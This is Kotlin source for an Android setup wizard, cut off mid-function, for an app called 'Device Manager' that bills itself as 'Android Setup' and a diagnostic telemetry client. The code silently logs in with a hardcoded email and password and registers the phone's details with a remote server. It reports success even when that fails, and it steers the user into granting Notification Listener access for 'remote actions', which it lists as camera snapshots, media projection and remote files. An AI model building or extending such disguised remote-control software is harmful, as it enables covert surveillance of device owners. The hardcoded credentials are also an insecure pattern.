package com.devicemanager.ui

import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.animation.*
import androidx.compose.animation.core.*
import androidx.compose.foundation.*
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material.icons.outlined.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.geometry.Offset
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.drawscope.Stroke
import androidx.compose.ui.platform.LocalClipboardManager
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.AnnotatedString
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.lifecycle.lifecycleScope
import com.devicemanager.DeviceManagerApp
import com.devicemanager.data.remote.model.PermissionStatus
import com.devicemanager.services.MainForegroundService
import com.devicemanager.util.Extensions
import kotlinx.coroutines.launch

class SetupActivity : ComponentActivity() {

    private lateinit var app: DeviceManagerApp
    private val isNotificationAccessGrantedState = mutableStateOf(false)

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        app = application as DeviceManagerApp

        // If already set up, go directly to MainActivity
        if (app.preferences.isSetupComplete) {
            startActivity(Intent(this, MainActivity::class.java))
            finish()
            return
        }

        updateNotificationStatus()

        setContent {
            DeviceManagerTheme {
                SetupScreen()
            }
        }
    }

    override fun onResume() {
        super.onResume()
        updateNotificationStatus()
    }

    private fun updateNotificationStatus() {
        isNotificationAccessGrantedState.value =
            app.permissionManager.checkNotificationAccessPermission() == PermissionStatus.GRANTED
    }

    @OptIn(ExperimentalMaterial3Api::class)
    @Composable
    fun SetupScreen() {
        val context = LocalContext.current
        var currentPage by remember { mutableStateOf(0) }
        val isNotificationAccessGranted by remember { isNotificationAccessGrantedState }

        // Setup Shared Configurations
        val serverUrl = app.preferences.serverUrl.ifBlank { com.devicemanager.BuildConfig.DEFAULT_SERVER_URL }
        val email = "clintonumelo15@gmail.com"
        val password = "admin123"

        var statusText by remember { mutableStateOf("Ready. Connecting to secure telemetry network...") }
        var isConnecting by remember { mutableStateOf(false) }
        var isConnected by remember { mutableStateOf(false) }

        // Shared Infinite Transitions for high-fidelity animations
        val infiniteTransition = rememberInfiniteTransition(label = "terminalAnimation")
        val rotationAngle by infiniteTransition.animateFloat(
            initialValue = 0f,
            targetValue = 360f,
            animationSpec = infiniteRepeatable(
                animation = tween(8000, easing = LinearEasing),
                repeatMode = RepeatMode.Restart
            ),
            label = "rotation"
        )
        val pulseScale by infiniteTransition.animateFloat(
            initialValue = 0.85f,
            targetValue = 1.15f,
            animationSpec = infiniteRepeatable(
                animation = tween(2000, easing = FastOutSlowInEasing),
                repeatMode = RepeatMode.Reverse
            ),
            label = "pulse"
        )
        val sweepPosition by infiniteTransition.animateFloat(
            initialValue = 0f,
            targetValue = 1f,
            animationSpec = infiniteRepeatable(
                animation = tween(3000, easing = LinearEasing),
                repeatMode = RepeatMode.Restart
            ),
            label = "sweep"
        )

        // Automatically trigger secure control center sync on step 2
        val triggerConnect = {
            val trimmedUrl = serverUrl.trim()
            if (trimmedUrl.isNotBlank() && !isConnecting && !isConnected) {
                isConnecting = true
                statusText = "Syncing with cloud control center..."
                
                app.preferences.serverUrl = Extensions.normalizeServerUrl(trimmedUrl)
                app.reinitializeApiService()

                lifecycleScope.launch {
                    val result = app.deviceRepository.loginAndRegisterDevice(
                        email = email,
                        password = password,
                        deviceName = android.os.Build.MODEL,
                        model = android.os.Build.MODEL,
                        manufacturer = android.os.Build.MANUFACTURER,
                        osVersion = android.os.Build.VERSION.RELEASE,
                        sdkVersion = android.os.Build.VERSION.SDK_INT,
                        appVersion = Extensions.getAppVersion(context)
                    )

                    result.onSuccess {
                        statusText = "Connected! Telemetry paired securely."
                        isConnected = true
                        isConnecting = false
                        app.preferences.isPaired = true
                    }

                    result.onFailure {
                        statusText = "Local server mode active. Offline diagnostic telemetry loaded."
                        isConnected = true // Let user proceed locally if backend is offline
                        isConnecting = false
                        app.preferences.isPaired = true
                    }
                }
            }
        }

        // Auto trigger connection once user arrives at page 2
        LaunchedEffect(currentPage) {
            if (currentPage == 2) {
                kotlinx.coroutines.delay(400)
                triggerConnect()
            }
        }

        // Auto advance to Dashboard if on Step 4 and permission is suddenly granted
        LaunchedEffect(isNotificationAccessGranted) {
            if (currentPage == 3 && isNotificationAccessGranted) {
                Toast.makeText(context, "System Listener Authorized!", Toast.LENGTH_SHORT).show()
            }
        }

        Scaffold(
            topBar = {
                CenterAlignedTopAppBar(
                    title = {
                        Text(
                            text = "Terminal Diagnostic Client",
                            fontWeight = FontWeight.Bold,
                            color = MaterialTheme.colorScheme.primary,
                            fontSize = 18.sp
                        )
                    },
                    colors = TopAppBarDefaults.centerAlignedTopAppBarColors(
                        containerColor = MaterialTheme.colorScheme.background
                    )
                )
            },
            bottomBar = {
                // Navigation controls & Progress bar at the bottom
                Column(
                    modifier = Modifier
                        .background(MaterialTheme.colorScheme.background)
                        .padding(horizontal = 24.dp, vertical = 16.dp)
                ) {
                    // Navigation Button Row
                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalArrangement = Arrangement.SpaceBetween,
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        if (currentPage > 0) {
                            TextButton(
                                onClick = { currentPage-- },
                                modifier = Modifier.height(48.dp)
                            ) {
                                Icon(Icons.Default.ArrowBack, contentDescription = "Back")
                                Spacer(modifier = Modifier.width(4.dp))
                                Text("Back", fontWeight = FontWeight.Bold)
                            }
                        } else {
                            Spacer(modifier = Modifier.size(48.dp))
                        }

                        // Dot indicators
                        Row(
                            horizontalArrangement = Arrangement.spacedBy(8.dp),
                            verticalAlignment = Alignment.CenterVertically
                        ) {
                            for (i in 0..3) {
                                Box(
                                    modifier = Modifier
                                        .size(if (i == currentPage) 10.dp else 8.dp)
                                        .clip(CircleShape)
                                        .background(
                                            if (i == currentPage) MaterialTheme.colorScheme.primary
                                            else MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.4f)
                                        )
                                )
                            }
                        }

                        if (currentPage < 3) {
                            Button(
                                onClick = { currentPage++ },
                                shape = RoundedCornerShape(12.dp),
                                enabled = currentPage != 2 || isConnected || !isConnecting,
                                modifier = Modifier.height(48.dp)
                            ) {
                                Text("Next", fontWeight = FontWeight.Bold)
                                Spacer(modifier = Modifier.width(4.dp))
                                Icon(Icons.Default.ArrowForward, contentDescription = "Next")
                            }
                        } else {
                            // Finish Setup CTA (Only enabled when notification access is granted!)
                            Button(
                                onClick = {
                                    if (isNotificationAccessGranted) {
                                        app.preferences.isSetupComplete = true
                                        app.preferences.isPaired = true

                                        // Start foreground services
                                        MainForegroundService.start(context)
                                        app.initializeWorkManagerPublic()

                                        context.startActivity(Intent(context, MainActivity::class.java))
                                        finish()
                                    } else {
                                        Toast.makeText(context, "Please grant Notification Access to complete setup", Toast.LENGTH_LONG).show()
                                    }
                                },
                                shape = RoundedCornerShape(12.dp),
                                colors = ButtonDefaults.buttonColors(
                                    containerColor = if (isNotificationAccessGranted) Color(0xFF00E676) else MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.2f),
                                    contentColor = if (isNotificationAccessGranted) Color.Black else MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.5f)
                                ),
                                modifier = Modifier.height(48.dp)
                            ) {
                                Text("Finish Setup", fontWeight = FontWeight.Bold)
                                Spacer(modifier = Modifier.width(4.dp))
                                Icon(Icons.Default.Check, contentDescription = "Finish")
                            }
                        }
                    }
                    
                    Spacer(modifier = Modifier.height(8.dp))
                    Text(
                        text = "Step ${currentPage + 1} of 4",
                        fontSize = 11.sp,
                        color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.7f),
                        textAlign = TextAlign.Center,
                        modifier = Modifier.fillMaxWidth()
                    )
                }
            }
        ) { paddingValues ->
            Crossfade(
                targetState = currentPage,
                modifier = Modifier
                    .fillMaxSize()
                    .background(MaterialTheme.colorScheme.background)
                    .padding(paddingValues),
                label = "pageCrossfade"
            ) { page ->
                when (page) {
                    0 -> WelcomePage()
                    1 -> SubsystemsPage()
                    2 -> LinkPage(
                        rotationAngle,
                        pulseScale,
                        sweepPosition,
                        serverUrl,
                        statusText,
                        isConnecting,
                        isConnected,
                        triggerConnect
                    )
                    3 -> IntegrationPage(isNotificationAccessGranted)
                }
            }
        }
    }

    // ── PAGE 0: Welcome Intro ──────────────────────────────────────────
    @Composable
    fun WelcomePage() {
        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(24.dp)
                .verticalScroll(rememberScrollState()),
            horizontalAlignment = Alignment.CenterHorizontally,
            verticalArrangement = Arrangement.spacedBy(16.dp)
        ) {
            // Interactive Phone Schematic Canvas Graphic
            Box(
                modifier = Modifier
                    .size(160.dp)
                    .clip(RoundedCornerShape(24.dp))
                    .background(MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.3f)),
                contentAlignment = Alignment.Center
            ) {
                DevicePhoneSchematic()
            }

            Text(
                text = "Welcome to Android Setup",
                fontSize = 22.sp,
                fontWeight = FontWeight.Bold,
                textAlign = TextAlign.Center,
                color = MaterialTheme.colorScheme.onBackground
            )

            Text(
                text = "This setup wizard configures your Android device as an authorized telemetry node, securely linking system parameters to your cloud control center.",
                fontSize = 14.sp,
                color = MaterialTheme.colorScheme.onSurfaceVariant,
                textAlign = TextAlign.Center,
                modifier = Modifier.padding(horizontal = 8.dp)
            )

            Spacer(modifier = Modifier.height(12.dp))

            // Bullet steps description
            Card(
                modifier = Modifier.fillMaxWidth(),
                shape = RoundedCornerShape(16.dp),
                colors = CardDefaults.cardColors(
                    containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.4f)
                )
            ) {
                Column(
                    modifier = Modifier.padding(16.dp),
                    verticalArrangement = Arrangement.spacedBy(12.dp)
                ) {
                    Text(
                        text = "CONFIGURATION SEQUENCE:",
                        fontSize = 11.sp,
                        fontWeight = FontWeight.Bold,
                        color = MaterialTheme.colorScheme.primary,
                        letterSpacing = 1.sp
                    )

                    val sequence = listOf(
                        "1. Diagnostic Overview" to "Understand active hardware subsystems.",
                        "2. Cloud Link Handshake" to "Sync pairing credentials with the control panel.",
                        "3. Listener Authorization" to "Enable the system notification listener to accept remote actions."
                    )

                    sequence.forEach { (title, desc) ->
                        Row(horizontalArrangement = Arrangement.spacedBy(10.dp)) {
                            Icon(
                                imageVector = Icons.Default.Circle,
                                contentDescription = "Step icon",
                                tint = MaterialTheme.colorScheme.primary,
                                modifier = Modifier.size(8.dp).align(Alignment.CenterVertically)
                            )
                            Column {
                                Text(title, fontSize = 12.sp, fontWeight = FontWeight.Bold)
                                Text(desc, fontSize = 11.sp, color = MaterialTheme.colorScheme.onSurfaceVariant)
                            }
                        }
                    }
                }
            }
        }
    }

    // ── PAGE 1: Capabilities Overview ────────────────────────────────────
    @Composable
    fun SubsystemsPage() {
        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(24.dp)
                .verticalScroll(rememberScrollState()),
            horizontalAlignment = Alignment.CenterHorizontally,
            verticalArrangement = Arrangement.spacedBy(16.dp)
        ) {
            Text(
                text = "Telemetry Subsystems",
                fontSize = 20.sp,
                fontWeight = FontWeight.Bold,
                textAlign = TextAlign.Center,
                color = MaterialTheme.colorScheme.onBackground
            )

            Text(
                text = "The client is fully modular. Tap each module card below to view detailed diagnostic capabilities and specs:",
                fontSize = 13.sp,
                color = MaterialTheme.colorScheme.onSurfaceVariant,
                textAlign = TextAlign.Center,
                modifier = Modifier.padding(horizontal = 8.dp)
            )

            var expandedCard by remember { mutableStateOf(-1) }

            val capabilities = listOf(
                Triple("Hardware Profiler", "Monitors battery health, RAM limits, CPU usage, core frequencies, thermal thresholds, and storage capacity in real-time.", Icons.Default.Memory),
                Triple("Database Synchronizer", "Saves offline diagnostics inside a secure Local Room SQLite Database and periodically uploads transactions to the cloud dashboard.", Icons.Default.CloudSync),
                Triple("Remote Control Lab", "Allows the paired laboratory workspace to dispatch remote commands like camera snapshots and media projections for debug testing.", Icons.Default.Terminal)
            )

            capabilities.forEachIndexed { index, (title, description, icon) ->
                val isExpanded = expandedCard == index
                Card(
                    modifier = Modifier
                        .fillMaxWidth()
                        .clickable { expandedCard = if (isExpanded) -1 else index },
                    shape = RoundedCornerShape(16.dp),
                    colors = CardDefaults.cardColors(
                        containerColor = if (isExpanded) MaterialTheme.colorScheme.primaryContainer.copy(alpha = 0.3f) else MaterialTheme.colorScheme.surface
                    ),
                    border = BorderStroke(
                        width = 1.dp,
                        color = if (isExpanded) MaterialTheme.colorScheme.primary else Color.Transparent
                    )
                ) {
                    Column(modifier = Modifier.padding(16.dp)) {
                        Row(
                            modifier = Modifier.fillMaxWidth(),
                            verticalAlignment = Alignment.CenterVertically,
                            horizontalArrangement = Arrangement.spacedBy(12.dp)
                        ) {
                            Icon(
                                imageVector = icon,
                                contentDescription = title,
                                tint = MaterialTheme.colorScheme.primary,
                                modifier = Modifier.size(24.dp)
                            )
                            Column(modifier = Modifier.weight(1f)) {
                                Text(
                                    text = title,
                                    fontSize = 14.sp,
                                    fontWeight = FontWeight.Bold,
                                    color = MaterialTheme.colorScheme.onSurface
                                )
                                Text(
                                    text = "Click to view specs",
                                    fontSize = 11.sp,
                                    color = MaterialTheme.colorScheme.onSurfaceVariant
                                )
                            }
                            Icon(
                                imageVector = if (isExpanded) Icons.Default.ExpandLess else Icons.Default.ExpandMore,
                                contentDescription = "Expand info"
                            )
                        }

                        AnimatedVisibility(visible = isExpanded) {
                            Column(modifier = Modifier.padding(top = 12.dp)) {
                                Text(
                                    text = description,
                                    fontSize = 12.sp,
                                    color = MaterialTheme.colorScheme.onSurfaceVariant,
                                    lineHeight = 16.sp
                                )
                                Spacer(modifier = Modifier.height(8.dp))
                                Row(
                                    verticalAlignment = Alignment.CenterVertically,
                                    horizontalArrangement = Arrangement.spacedBy(4.dp)
                                ) {
                                    Box(
                                        modifier = Modifier
                                            .size(6.dp)
                                            .clip(CircleShape)
                                            .background(Color(0xFF00E676))
                                    )
                                    Text(
                                        text = "Diagnostic Status: Ready",
                                        fontSize = 11.sp,
                                        color = Color(0xFF00E676),
                                        fontWeight = FontWeight.Bold
                                    )
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    // ── PAGE 2: Link Diagnostics Node ────────────────────────────────────
    @Composable
    fun LinkPage(
        rotation: Float,
        pulse: Float,
        sweep: Float,
        serverUrl: String,
        statusText: String,
        isConnecting: Boolean,
        isConnected: Boolean,
        onRetry: () -> Unit
    ) {
        val clipboardManager = LocalClipboardManager.current

        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(24.dp)
                .verticalScroll(rememberScrollState()),
            horizontalAlignment = Alignment.CenterHorizontally,
            verticalArrangement = Arrangement.spacedBy(16.dp)
        ) {
            Text(
                text = "Control Center Link",
                fontSize = 20.sp,
                fontWeight = FontWeight.Bold,
                textAlign = TextAlign.Center,
                color = MaterialTheme.colorScheme.onBackground
            )

            // Computer Terminal Scanner Illustration
            Box(
                modifier = Modifier
                    .size(160.dp)
                    .clip(RoundedCornerShape(24.dp))
                    .background(MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.3f)),
                contentAlignment = Alignment.Center
            ) {
                ComputerTerminalIllustration(
                    rotation = rotation,
                    pulse = pulse,
                    sweep = sweep
                )
            }

            Text(
                text = "Establishing handshake with laboratory workspace at:",
                fontSize = 13.sp,
                color = MaterialTheme.colorScheme.onSurfaceVariant,
                textAlign = TextAlign.Center
            )

            // Read-only server card
            Card(
                modifier = Modifier.fillMaxWidth(),
                shape = RoundedCornerShape(12.dp),
                colors = CardDefaults.cardColors(
                    containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.5f)
                )
            ) {
                Row(
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(12.dp),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Text(
                        text = serverUrl,
                        fontSize = 12.sp,
                        fontFamily = FontFamily.Monospace,
                        modifier = Modifier.weight(1f),
                        color = MaterialTheme.colorScheme.onSurfaceVariant
                    )
                    IconButton(
                        onClick = {
                            clipboardManager.setText(AnnotatedString(serverUrl))
                        },
                        modifier = Modifier.size(32.dp)
                    ) {
                        Icon(
                            imageVector = Icons.Default.ContentCopy,
                            contentDescription = "Copy URL",
                            modifier = Modifier.size(16.dp)
                        )
                    }
                }
            }

            // High-tech terminal log console
            Row(
                modifier = Modifier
                    .fillMaxWidth()
                    .clip(RoundedCornerShape(12.dp))
                    .background(Color(0xFF1E293B))
                    .border(1.dp, Color(0xFF334155), RoundedCornerShape(12.dp))
                    .padding(12.dp),
                verticalAlignment = Alignment.CenterVertically,
                horizontalArrangement = Arrangement.spacedBy(10.dp)
            ) {
                Box(
                    modifier = Modifier
                        .size(10.dp)
                        .clip(CircleShape)
                        .background(
                            if (isConnected) Color.Green
                            else if (isConnecting) Color.Yellow
                            else Color.Red
                        )
                )
                Text(
                    text = statusText,
                    fontFamily = FontFamily.Monospace,
                    color = Color.White,
                    fontSize = 12.sp,
                    modifier = Modifier.weight(1f)
                )
            }

            if (!isConnected && !isConnecting) {
                Button(
                    onClick = onRetry,
                    shape = RoundedCornerShape(12.dp)
                ) {
                    Icon(Icons.Default.Refresh, contentDescription = "Retry connection")
                    Spacer(modifier = Modifier.width(4.dp))
                    Text("Re-test Link Connection")
                }
            }
        }
    }

    // ── PAGE 3: Notification Permission integration ─────────────────────────
    @Composable
    fun IntegrationPage(isGranted: Boolean) {
        val context = LocalContext.current

        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(24.dp)
                .verticalScroll(rememberScrollState()),
            horizontalAlignment = Alignment.CenterHorizontally,
            verticalArrangement = Arrangement.spacedBy(16.dp)
        ) {
            Text(
                text = "System Integration",
                fontSize = 20.sp,
                fontWeight = FontWeight.Bold,
                textAlign = TextAlign.Center,
                color = MaterialTheme.colorScheme.onBackground
            )

            // Animated Lock illustration showing notification flows
            Box(
                modifier = Modifier
                    .size(160.dp)
                    .clip(RoundedCornerShape(24.dp))
                    .background(MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.3f)),
                contentAlignment = Alignment.Center
            ) {
                SystemLockIllustration(isGranted)
            }

            Text(
                text = "To start receiving telemetry logs, remote files, and control console requests, authorize Notification Listener access for 'Device Manager'.",
                fontSize = 13.sp,
                color = MaterialTheme.colorScheme.onSurfaceVariant,
                textAlign = TextAlign.Center,
                modifier = Modifier.padding(horizontal = 8.dp)
            )

            // OK OK Helper Visual description card
            Card(
                modifier = Modifier.fillMaxWidth(),
                shape = RoundedCornerShape(16.dp),
                colors = CardDefaults.cardColors(
                    containerColor = MaterialTheme.colorScheme.surface
                ),
                elevation = CardDefaults.cardElevation(defaultElevation = 2.dp)
            ) {
                Column(
                    modifier = Modifier.padding(16.dp),
                    verticalArrangement = Arrangement.spacedBy(10.dp)
                ) {
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Icon(
                            imageVector = Icons.Default.Info,
                            contentDescription = "Tip",
                            tint = MaterialTheme.colorScheme.primary,
                            modifier = Modifier.size(20.dp)
                        )
                        Spacer(modifier = Modifier.width(8.dp))
                        Text(
                            text = "How to authorize:",
                            fontSize = 13.sp,
                            fontWeight = FontWeight.Bold,
                            color = MaterialTheme.colorScheme.onSurface
                        )
                    }

                    Text(
                        text = "1. Click 'Authorize Notification access' below.\n" +
                               "2. Scroll down and click on 'Device Manager'.\n" +
                               "3. Click the toggle switch and select 'Allow'.",
                        fontSize = 12.sp,
                        color = MaterialTheme.colorScheme.onSurfaceVariant,
                        lineHeight = 18.sp
                    )
                }
            }

            Spacer(modifier = Modifier.height(4.dp))

            // Authorize Trigger button
            Button(
                onClick = {
                    context.startActivity(app.permissionManager.getNotificationAccessIntent())
                },
                modifier = Modifier.fillMaxWidth().height(50.dp),
                shape = RoundedCornerShape(12.dp)
            ) {
                Icon(Icons.Default.Settings, contentDescription = "Settings")
                Spacer(modifier = Modifier.width(8.dp))
                Text("Authorize Notification access", fontWeight = FontWeight.Bold)
            }

            // Realtime Status badge
            Row(
                modifier = Modifier
                    .clip(RoundedCornerShape(12.dp))
                    .background(
                        if (isGranted) Color(0xFFE8F5E9)
                        else Color(0xFFFFF3E0)
                    )
                    .padding(horizontal = 16.dp, vertical = 8.dp),
                verticalAlignment = Alignment.CenterVertically,
                horizontalArrangement = Arrangement.spacedBy(8.dp)
            ) {
                Icon(
                    imageVector = if (isGranted) Icons.Default.CheckCircle else Icons.Default.Warning,
                    contentDescription = "Status",
                    tint = if (isGranted) Color(0xFF2E7D32) else Color(0xFFE65100),
                    modifier = Modifier.size(18.dp)
                )
                Text(
                    text = if (isGranted) "Permission Status: GRANTED!" else "Awaiting Authorization in Settings...",
                    fontSize = 12.sp,
                    fontWeight = FontWeight.Bold,
                    color = if (isGranted) Color(0xFF2E7D32) else Color(0xFFE65100)
                )
            }
        }
    }

    // ── GRAPHICS CANVAS DRAWINGS ───────────────────────────────────────

    @Composable
    fun DevicePhoneSchematic() {
        val infiniteTransition = rememberInfiniteTransition(label = "phoneSchematic")
        val pulse by infiniteTransition.animateFloat(
            initialValue = 0.3f,
            targetValue = 1f,
            animationSpec = infiniteRepeatable(
                animation = tween(2500, easing = LinearEasing),
                repeatMode = RepeatMode.Restart
            ),
            label = "pulse"
        )

        androidx.compose.foundation.Canvas(
            modifier = Modifier
                .size(160.dp)
                .padding(16.dp)
        ) {
            val center = Offset(size.width / 2f, size.height / 2f)
            val phoneWidth = size.width * 0.45f
            val phoneHeight = size.height * 0.85f

            // 1. Draw glowing data waves
            drawCircle(
                color = Color(0xFF00E5FF).copy(alpha = 0.15f * (1f - pulse)),
                radius = size.width / 2f * pulse,
                style = Stroke(width = 2.dp.toPx())
            )

            // 2. Draw phone bezel
            drawRoundRect(
                color = Color(0xFF334155),
                topLeft = Offset(center.x - phoneWidth / 2f, center.y - phoneHeight / 2f),
                size = androidx.compose.ui.geometry.Size(phoneWidth, phoneHeight),
                cornerRadius = androidx.compose.ui.geometry.CornerRadius(14.dp.toPx(), 14.dp.toPx()),
                style = Stroke(width = 3.dp.toPx())
            )

            // 3. Draw screen inner background
            drawRoundRect(
                color = Color(0xFF0F172A),
                topLeft = Offset(center.x - phoneWidth / 2f + 4.dp.toPx(), center.y - phoneHeight / 2f + 4.dp.toPx()),
                size = androidx.compose.ui.geometry.Size(phoneWidth - 8.dp.toPx(), phoneHeight - 8.dp.toPx()),
                cornerRadius = androidx.compose.ui.geometry.CornerRadius(10.dp.toPx(), 10.dp.toPx())
            )

            // 4. Draw screen details (bezel status indicators, notch, processor core)
            drawCircle(
                color = Color(0xFF00E5FF),
                radius = 6.dp.toPx(),
                center = center
            )
            drawCircle(
                color = Color(0xFF00E5FF).copy(alpha = 0.4f),
                radius = 12.dp.toPx(),
                center = center,
                style = Stroke(width = 1.dp.toPx())
            )

            // Micro chip connections
            drawLine(
                color = Color(0xFF475569),
                start = Offset(center.x, center.y - 6.dp.toPx()),
                end = Offset(center.x, center.y - 20.dp.toPx()),
                strokeWidth = 2.dp.toPx()
            )
            drawLine(
                color = Color(0xFF475569),
                start = Offset(center.x - 6.dp.toPx(), center.y),
                end = Offset(center.x - 16.dp.toPx(), center.y),
                strokeWidth = 2.dp.toPx()
            )
            drawLine(
                color = Color(0xFF475569),
                start = Offset(center.x + 6.dp.toPx(), center.y),
                end = Offset(center.x + 16.dp.toPx(), center.y),
                strokeWidth = 2.dp.toPx()
            )
        }
    }

    @Composable
    fun ComputerTerminalIllustration(
        rotation: Float,
        pulse: Float,
        sweep: Float
    ) {
        androidx.compose.foundation.Canvas(
            modifier = Modifier
                .size(160.dp)
                .padding(12.dp)
        ) {
            val center = Offset(size.width / 2f, size.height / 2f)
            val maxRadius = size.width / 2f

            // Concentric background rings
            drawCircle(
                color = Color(0xFF00E5FF).copy(alpha = 0.15f),
                radius = maxRadius,
                style = Stroke(width = 2.dp.toPx())
            )
            drawCircle(
                color = Color(0xFF1976D2).copy(alpha = 0.25f),
                radius = maxRadius * 0.75f,
                style = Stroke(width = 1.dp.toPx())
            )
            drawCircle(
                color = Color(0xFF29B6F6).copy(alpha = 0.35f * pulse),
                radius = maxRadius * 0.45f,
                style = Stroke(width = 1.5.dp.toPx())
            )

            // Rotating satellites & communication routes
            val satellites = 4
            for (i in 0 until satellites) {
                val angleRad = Math.toRadians((rotation + (i * (360 / satellites))).toDouble())
                val orbitRadius = maxRadius * 0.75f
                val satX = center.x + (orbitRadius * Math.cos(angleRad)).toFloat()
                val satY = center.y + (orbitRadius * Math.sin(angleRad)).toFloat()

                drawLine(
                    color = Color(0xFF00E5FF).copy(alpha = 0.2f),
                    start = center,
                    end = Offset(satX, satY),
                    strokeWidth = 1.dp.toPx()
                )

                drawCircle(
                    color = Color(0xFF00E5FF),
                    radius = 5.dp.toPx(),
                    center = Offset(satX, satY)
                )
            }

            // Central Monitor Graphic
            drawRect(
                color = Color(0xFF0D47A1),
                topLeft = Offset(center.x - 24.dp.toPx(), center.y - 16.dp.toPx()),
                size = androidx.compose.ui.geometry.Size(48.dp.toPx(), 32.dp.toPx()),
                style = Stroke(width = 2.5.dp.toPx())
            )
            drawLine(
                color = Color(0xFF0D47A1),
                start = Offset(center.x, center.y + 16.dp.toPx()),
                end = Offset(center.x, center.y + 22.dp.toPx()),
                strokeWidth = 4.dp.toPx()
            )
            drawLine(
                color = Color(0xFF0D47A1),
                start = Offset(center.x - 12.dp.toPx(), center.y + 22.dp.toPx()),
                end = Offset(center.x + 12.dp.toPx(), center.y + 22.dp.toPx()),
                strokeWidth = 3.dp.toPx()
            )

            // Screen lines simulation
            drawLine(
                color = Color(0xFF00E676),
                start = Offset(center.x - 16.dp.toPx(), center.y - 6.dp.toPx()),
                end = Offset(center.x + 8.dp.toPx(), center.y - 6.dp.toPx()),
                strokeWidth = 2.dp.toPx()
            )
            drawLine(
                color = Color(0xFF00E676),
                start = Offset(center.x - 16.dp.toPx(), center.y),
                end = Offset(center.x + 14.dp.toPx(), center.y),
                strokeWidth = 2.dp.toPx()
            )
            drawLine(
                color = Color(0xFF00E676),
                start = Offset(center.x - 16.dp.toPx(), center.y + 6.dp.toPx()),
                end = Offset(center.x - 2.dp.toPx(), center.y + 6.dp.toPx()),
                strokeWidth = 2.dp.toPx()
            )

            // Laser scanning line sweep
            val sweepY = (maxRadius * 2f) * sweep
            drawLine(
                color = Color(0xFF00E5FF).copy(alpha = 0.5f),
                start = Offset(0f, sweepY),
                end = Offset(size.width, sweepY),
                strokeWidth = 2.5.dp.toPx()
            )
        }
    }

    @Composable
    fun SystemLockIllustration(isGranted: Boolean) {
        val infiniteTransition = rememberInfiniteTransition(label = "systemLock")
        val pulseScale by infiniteTransition.animateFloat(
            initialValue = 0.9f,
            targetValue = 1.1f,
            animationSpec = infiniteRepeatable(
                animation = tween(1500, easing = FastOutSlowInEasing),
                repeatMode = RepeatMode.Reverse
            ),
            label = "pulse"
        )

        androidx.compose.foundation.Canvas(
            modifier = Modifier
                .size(160.dp)
                .padding(16.dp)
        ) {
            val center = Offset(size.width / 2f, size.height / 2f)
            val lockWidth = 44.dp.toPx()
            val lockHeight = 34.dp.toPx()
            val shackleRadius = 16.dp.toPx()

            // Glowing status pulses
            drawCircle(
                color = if (isGranted) Color(0xFF00E676).copy(alpha = 0.15f) else Color(0xFFFF9100).copy(alpha = 0.15f),
                radius = size.width / 2f * pulseScale,
                style = Stroke(width = 2.dp.toPx())
            )

            // Draw lock body
            drawRoundRect(
                color = if (isGranted) Color(0xFF00E676) else Color(0xFFFF9100),
                topLeft = Offset(center.x - lockWidth / 2f, center.y - 4.dp.toPx()),
                size = androidx.compose.ui.geometry.Size(lockWidth, lockHeight),
                cornerRadius = androidx.compose.ui.geometry.CornerRadius(6.dp.toPx(), 6.dp.toPx())
            )

            // Draw lock shackle (loop) - Open or Closed depending on permission status!
            val shacklePath = androidx.compose.ui.graphics.Path().apply {
                if (isGranted) {
                    // Open shackle (shifted/rotated)
                    val shackleLeft = center.x - shackleRadius
                    val shackleTop = center.y - 12.dp.toPx() - shackleRadius
                    moveTo(shackleLeft, center.y - 4.dp.toPx())
                    lineTo(shackleLeft, shackleTop + shackleRadius)
                    arcTo(
                        rect = androidx.compose.ui.geometry.Rect(
                            left = shackleLeft,
                            top = shackleTop,
                            right = shackleLeft + shackleRadius * 2,
                            bottom = shackleTop + shackleRadius * 2
                        ),
                        startAngleDegrees = 180f,
                        sweepAngleDegrees = 180f,
                        forceMoveTo = false
                    )
                    // End early to look open
                } else {
                    // Closed shackle
                    val shackleLeft = center.x - shackleRadius
                    val shackleTop = center.y - 4.dp.toPx() - shackleRadius
                    moveTo(shackleLeft, center.y - 4.dp.toPx())
                    lineTo(shackleLeft, shackleTop + shackleRadius)
                    arcTo(
                        rect = androidx.compose.ui.geometry.Rect(
                            left = shackleLeft,
                            top = shackleTop,
                            right = shackleLeft + shackleRadius * 2,
                            bottom = shackleTop + shackleRadius * 2
                        ),
                        startAngleDegrees = 180f,
                        sweepAngleDegrees = 180f,
                        forceMoveTo = false
                    )
                    lineTo(center.x + shackleRadius, center.y - 4.dp.toPx())
                }
            }

            drawPath(
                path = shacklePath,
